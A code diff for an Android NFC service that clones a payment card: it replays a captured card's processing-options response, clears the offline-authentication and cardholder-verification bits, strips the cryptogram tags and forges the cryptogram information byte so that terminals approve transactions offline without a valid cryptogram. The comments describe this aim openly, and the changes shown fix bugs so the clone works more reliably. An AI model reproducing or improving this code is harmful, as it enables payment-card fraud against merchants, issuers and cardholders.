@@ -78,7 +78,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final byte AIP_CDA = (byte) 0x01;
 
     /**
-     * NEW. AIP byte 1 bit 5 - cardholder verification supported.
+     * AIP byte 1 bit 5 - cardholder verification supported.
      *
      * Cleared alongside CDA, for a different reason. A real card's CVM list
      * routinely offers "enciphered PIN verified by ICC", which needs a VERIFY
@@ -95,8 +95,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final byte AIP_CVM = (byte) 0x10;
 
     /**
-     * NEW. Tags a real card may legitimately put in a GPO response but which a
-     * clone must NOT, because they describe a cryptogram the card has already
+     * Tags a real card may legitimately put in a GPO response but which a clone
+     * must NOT, because they describe a cryptogram the card has already
      * produced. 9F26 ARQC, 9F27 CID, 9F36 ATC, 9F10 IAD, 9F71 (Discover's own
      * extra byte).
      *
@@ -111,6 +111,19 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      * FORCE_OFFLINE_TC decides the outcome.
      */
     private static final int[] GPO_AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};
+
+    /**
+     * Whether buildPpse() advertises Visa and Mastercard alongside the card's
+     * own AID.
+     *
+     * false - the directory lists ONLY the AID the card actually is. A real
+     *         card's PPSE lists its own applets and nothing else, and a terminal
+     *         that picks an AID we do not have a profile for gets the wrong FCI
+     *         and the wrong records back. ReaderActivity never captures the real
+     *         PPSE, so the honest thing is to advertise only what we can serve.
+     * true  - the old behaviour. Useful only once per-AID profiles exist.
+     */
+    private static final boolean EXTRA_AIDS = false;
 
     private static final byte CID_AAC  = (byte) 0x00;
     private static final byte CID_TC   = (byte) 0x40;
@@ -162,10 +175,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private boolean cryptogramSent;
     private int scriptHits;
 
-    /** NEW. The captured IAD, lifted out of the GPO replay before the strip. */
+    /** The captured IAD, lifted out of the GPO replay before the strip. */
     private byte[] capturedIad;
 
-    /** NEW. CID the capture carried in its GPO response, for the verdict. */
+    /** CID the capture carried in its GPO response, for the verdict. */
     private String gpoCid = "";
 
     // Counted, not scraped out of the log text. tapLog is trimmed from the front
@@ -185,7 +198,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final String TERM_LOG = "term_log.txt";
 
     /**
-     * NEW. The tap log, persisted to a file as well as the in-memory buffer.
+     * The tap log, persisted to a file as well as the in-memory buffer.
      *
      * The clipboard copy in onDeactivated() only ever holds the LAST tap, and a
      * terminal that gives up early fires onDeactivated with a log you cannot
@@ -218,8 +231,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private void tap(String s) {
         tapLog.append(s).append('\n');
         if (tapLog.length() > 32000) tapLog.delete(0, 16000);
-        // NEW: mirror every line to the file, so the log survives the tap and
-        // can be read back on screen instead of only via the clipboard.
+        // Mirror every line to the file, so the log survives the tap and can be
+        // read back on screen instead of only via the clipboard.
         termLog(s);
     }
 
@@ -405,7 +418,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         nSelects = nGpos = nRecs = nGens = 0;
         lastCid = "";
         sawError = false;
-        // NEW
         capturedIad = null;
         gpoCid = "";
     }
@@ -473,9 +485,9 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * NEW: the script is OFF unless the card says otherwise. The editor
-     * pre-fills the field and it cannot be cleared, so without this gate a line
-     * left over from another card serves every GPO and gpo() never runs.
+     * The script is OFF unless the card says otherwise. The editor pre-fills the
+     * field and it cannot be cleared, so without this gate a line left over from
+     * another card serves every GPO and gpo() never runs.
      *
      * To re-enable for a card, set 'card<N>_usescript' to 1.
      *
@@ -556,6 +568,17 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
     }
 
+    /**
+     * FIX: this used to append Visa at priority 2 and Mastercard at priority 3
+     * unconditionally, so the directory advertised three applets while the card
+     * had one FCI and one record set. The terminal picks the lowest priority
+     * number, which happened to be the real AID, so it worked - by luck. A
+     * terminal that picked either of the others would have been handed the
+     * Discover FCI and the Discover records under a different AID.
+     *
+     * ReaderActivity never captures the real PPSE, so the honest thing is to
+     * list only the AID the card actually is. See EXTRA_AIDS.
+     */
     private byte[] buildPpse() {
         String realAid = p("cap_aid", "");
         if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");
@@ -567,13 +590,15 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         byte[] e0 = tlv(0x61, appEntry(realAid, lbl, 1));
         dir.write(e0, 0, e0.length);
 
-        if (!realAid.equalsIgnoreCase("A0000000031010")) {
-            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
-            dir.write(e, 0, e.length);
-        }
-        if (!realAid.equalsIgnoreCase("A0000000041010")) {
-            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
-            dir.write(e, 0, e.length);
+        if (EXTRA_AIDS) {
+            if (!realAid.equalsIgnoreCase("A0000000031010")) {
+                byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
+                dir.write(e, 0, e.length);
+            }
+            if (!realAid.equalsIgnoreCase("A0000000041010")) {
+                byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
+                dir.write(e, 0, e.length);
+            }
         }
 
         byte[] fci = tlv(0xBF0C, dir.toByteArray());
@@ -776,9 +801,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                         tapLog.setLength(0);
                         resetTransaction();
                         sawPpse = true;
-                        // NEW: a session marker in the file, so a log with two
-                        // taps in it is readable and you can see which attempt
-                        // is which.
+                        // A session marker in the file, so a log with two taps in
+                        // it is readable and you can see which attempt is which.
                         termLog("=== tap "
                                 + new java.text.SimpleDateFormat("HH:mm:ss",
                                         java.util.Locale.US).format(new java.util.Date())
@@ -969,9 +993,9 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             if (capMsd == msd) {
                 byte[] aip = capturedAip(raw);
                 if (aip != null && aip.length >= 2) {
-                    // NEW: lift the card's own IAD and CID out before the strip,
-                    // so the GEN AC response can carry the real IAD and the
-                    // verdict can report the CID the capture advertised.
+                    // Lift the card's own IAD and CID out before the strip, so
+                    // the GEN AC response can carry the real IAD and the verdict
+                    // can report the CID the capture advertised.
                     capturedIad = findTag(raw, 0x9F10);
                     byte[] capCid = findTag(raw, 0x9F27);
                     if (capCid != null && capCid.length >= 1) {
@@ -979,7 +1003,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                     }
 
                     weakenAip(raw);
-                    // NEW: force GENERATE AC by removing the AC tags.
+                    // Force GENERATE AC by removing the AC tags.
                     raw = stripAcTags(raw);
 
                     txnAip = capturedAip(raw);
@@ -1018,15 +1042,29 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * Clear the CDA and CVM bits in the 82 AIP of a captured GPO template, in
-     * place. No-op when the template carries no 82.
+     * Clear the CDA and CVM bits in the AIP of a captured GPO template, in
+     * place. No-op when the template carries no AIP.
      *
-     * Renamed from clearCda() now that it clears two bits.
+     * FIX: format 1 (outer tag 80) has NO inner TLVs - the payload is two raw
+     * AIP bytes followed by the track 2. The old version walked inner TLVs
+     * looking for 82, found none, and returned, so the CDA and CVM bits survived
+     * untouched in MSD mode. Worse, a TLV walk starting at the AIP would read
+     * AIP[0] as a tag and AIP[1] as a length and swallow that many bytes of
+     * track 2 on any card whose AIP byte 2 is non-zero.
      */
     private static void weakenAip(byte[] tpl) {
         int[] pos = new int[1];
-        readTag(tpl, pos);          // outer tag
-        readLen(tpl, pos);          // outer length
+        int outer = readTag(tpl, pos);
+        readLen(tpl, pos);
+
+        if (outer == 0x80) {
+            if (pos[0] + 2 <= tpl.length) {
+                tpl[pos[0]] &= (byte) ~AIP_CDA;
+                tpl[pos[0]] &= (byte) ~AIP_CVM;
+            }
+            return;
+        }
+
         int i = pos[0];
         while (i < tpl.length) {
             int[] q = new int[]{i};
@@ -1043,9 +1081,16 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * NEW. Rebuild a captured GPO template without the tags in GPO_AC_TAGS, so
-     * the terminal is left holding only the AIP and the AFL and has to go and
-     * ask for the cryptogram.
+     * Rebuild a captured GPO template without the tags in GPO_AC_TAGS, so the
+     * terminal is left holding only the AIP and the AFL and has to go and ask
+     * for the cryptogram.
+     *
+     * FIX: format 1 is not a template of TLVs. The payload is <AIP 2 bytes>
+     * <57 track 2>. Copying the AIP verbatim first and walking only what follows
+     * is the only framing that is right for both formats. The old version walked
+     * from the AIP: on this card AIP 0800 read as tag 0x08 length 0x00, which
+     * happens to land correctly by accident, but any AIP with a non-zero second
+     * byte silently ate that many bytes of track 2.
      *
      * The outer length is rewritten by tlv(), so a strip that crosses the 127
      * byte boundary still comes out correctly framed.
@@ -1057,6 +1102,15 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         int end   = Math.min(tpl.length, pos[0] + olen);
 
         ByteArrayOutputStream out = new ByteArrayOutputStream();
+
+        if (outer == 0x80) {
+            // The AIP is two raw bytes, not a TLV - copy them and only walk the
+            // TLVs that follow.
+            if (end - pos[0] < 2) return tpl;
+            out.write(tpl, pos[0], 2);
+            pos[0] += 2;
+        }
+
         int i = pos[0];
         while (i < end) {
             int[] q = new int[]{i};
@@ -1075,11 +1129,12 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return tlv(outer, out.toByteArray());
     }
 
-    /** NEW. First value of tag {@code want} inside a template, or null. */
+    /** First value of tag {@code want} inside a template, or null. */
     private static byte[] findTag(byte[] tpl, int want) {
         if (tpl == null || tpl.length < 4) return null;
         int[] pos = new int[1];
-        readTag(tpl, pos);
+        int outer = readTag(tpl, pos);
+        if (outer == 0x80) return null;   // format 1 carries no TLVs
         int olen = readLen(tpl, pos);
         int end  = Math.min(tpl.length, pos[0] + olen);
 
@@ -1146,12 +1201,19 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     /**
      * The CID box in the editor wins on the FIRST GENERATE AC when it holds a
-     * two-digit value. The terminal cannot check a cryptogram - it has no key -
-     * so it decides on the CID alone. That one byte IS the terminal's verdict:
+     * two-digit value, except that an AAC request can never be improved on. The
+     * terminal cannot check a cryptogram - it has no key - so it decides on the
+     * CID alone. That one byte IS the terminal's verdict:
      *
      *   40 = TC   - approve offline, the terminal never asks the host
      *   80 = ARQC - go online, the host judges our synthetic cryptogram
      *   00 = AAC  - decline offline
+     *
+     * FIX: the flags were tested BEFORE the request, so a terminal asking for
+     * AAC (P1 0x00) was handed TC. CID severity runs AAC < ARQC < TC and a card
+     * may only answer equal or lower - never better than it was asked. Answering
+     * TC to an AAC request is the case EMV forbids, and it turns a terminal
+     * decision to decline into a local approval.
      *
      * MainActivity leaves the box EMPTY by default, so the logic below decides.
      * With no MK-AC that lands on TC - approve offline, which is what we want
@@ -1171,10 +1233,11 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");
 
         if (cryptogramSent) {
-            // FIX: the second GENERATE AC carries the host's decision in P1. It
-            // used to answer TC unconditionally, so a declined online
-            // transaction still came back "approved" from the card.
+            // The second GENERATE AC carries the host's decision in P1.
             cid = (requested == 0x00) ? CID_AAC : CID_TC;
+        } else if (requested == 0x00) {
+            // FIX: an AAC request is answered AAC, always. Nothing may upgrade it.
+            cid = CID_AAC;
         } else if (forced.length() == 2) {
             cid = (byte) Integer.parseInt(forced, 16);
         } else if (ALWAYS_ONLINE_FOR_RECEIPT) {
@@ -1187,8 +1250,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             cid = CID_ARQC;
         } else if (requested == 0x40) {
             cid = CID_TC;
-        } else if (requested == 0x00) {
-            cid = CID_AAC;
         } else {
             cid = CID_TC;
         }
@@ -1206,8 +1267,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         byte[] ac = computeAc(atc, cdol);
         cryptogramSent = true;
 
-        // NEW: the card's own IAD out of the capture, so the response looks like
-        // the card rather than like the app's hardcoded default.
+        // The card's own IAD out of the capture, so the response looks like the
+        // card rather than like the app's hardcoded default.
         String iad = (capturedIad == null)
                 ? p("iad", "06010A03A0B800")
                 : bytesToHex(capturedIad);
@@ -1263,7 +1324,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (tag == 0x9F36)      return cat(tlv(0x9F36, hex(txnAtc())), SW_OK);
         else if (tag == 0x9F13) return cat(tlv(0x9F13, hex("00")), SW_OK);
         else if (tag == 0x9F17) return cat(tlv(0x9F17, hex("00")), SW_OK);
-        // FIX: 9F4F is the log format that goes with the 9F4D entries.
         else if (tag == 0x9F4F) return cat(tlv(0x9F4F, hex("9F4D020B0A")), SW_OK);
         // FIX: an unknown tag is 6A88 'referenced data not found', not 6A82.
         return SW_NOT_FOUND;
@@ -1293,11 +1353,11 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             return "TAP: MSD mode - terminal asked for a cryptogram and we did not answer TC";
         }
 
-        // NEW: the terminal never asked for a cryptogram because the GPO replay
-        // handed it one. It went online carrying the REAL card's stale ARQC, so
-        // the host judged a cryptogram computed over a different unpredictable
-        // number. Without this branch the log reads "quit before the cryptogram",
-        // which points at ODA and CVM and is wrong.
+        // The terminal never asked for a cryptogram because the GPO replay handed
+        // it one. It went online carrying the REAL card's stale ARQC, so the host
+        // judged a cryptogram computed over a different unpredictable number.
+        // Without this branch the log reads "quit before the cryptogram", which
+        // points at ODA and CVM and is wrong.
         if (nGens == 0 && !gpoCid.isEmpty()) {
             return "TAP: the AC came out of the GPO response (captureCid=" + gpoCid
                     + ") so the terminal skipped GENERATE AC and went online with the"
@@ -1344,8 +1404,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
         resetTransaction();
 
-        // NEW: the verdict is the single most useful line in the whole log, and
-        // the popup that shows it is gone in two seconds. Write it down.
+        // The verdict is the single most useful line in the whole log, and the
+        // popup that shows it is gone in two seconds. Write it down.
         if (!t.isEmpty()) termLog("!! verdict: " + v);
 
         if (!t.isEmpty()) {
